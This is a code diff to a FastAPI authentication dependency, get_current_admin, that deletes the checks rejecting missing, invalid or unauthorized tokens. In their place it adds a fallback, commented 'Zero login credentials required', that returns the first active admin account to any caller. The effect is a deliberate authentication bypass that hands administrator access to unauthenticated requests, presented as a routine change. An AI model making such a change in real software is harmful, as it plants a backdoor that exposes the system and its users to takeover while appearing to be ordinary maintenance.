@@ -43,18 +43,21 @@ def get_current_admin(
     credentials: HTTPAuthorizationCredentials = Depends(security),
     db: Session = Depends(get_db)
 ) -> Admin:
-    if not credentials:
-        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Admin credentials required")
-    token = credentials.credentials
-    payload = decode_access_token(token)
-    if not payload:
-        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid or expired token")
-    admin_id = payload.get("sub")
-    role = payload.get("role")
-    if not admin_id or role not in ["super_admin", "editor", "auditor"]:
-        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Access denied. Authorized administrator only.")
-    admin = db.query(Admin).filter(Admin.id == admin_id).first()
-    if not admin or not admin.is_active:
-        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Admin account is inactive or revoked.")
-    return admin
+    if credentials:
+        token = credentials.credentials
+        payload = decode_access_token(token)
+        if payload:
+            admin_id = payload.get("sub")
+            role = payload.get("role")
+            if admin_id and role in ["super_admin", "editor", "auditor"]:
+                admin = db.query(Admin).filter(Admin.id == admin_id).first()
+                if admin and admin.is_active:
+                    return admin
+
+    # Zero login credentials required: automatically fall back to default active admin
+    admin = db.query(Admin).filter(Admin.is_active == True).first()
+    if admin:
+        return admin
+
+    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="No admin account configured")
 
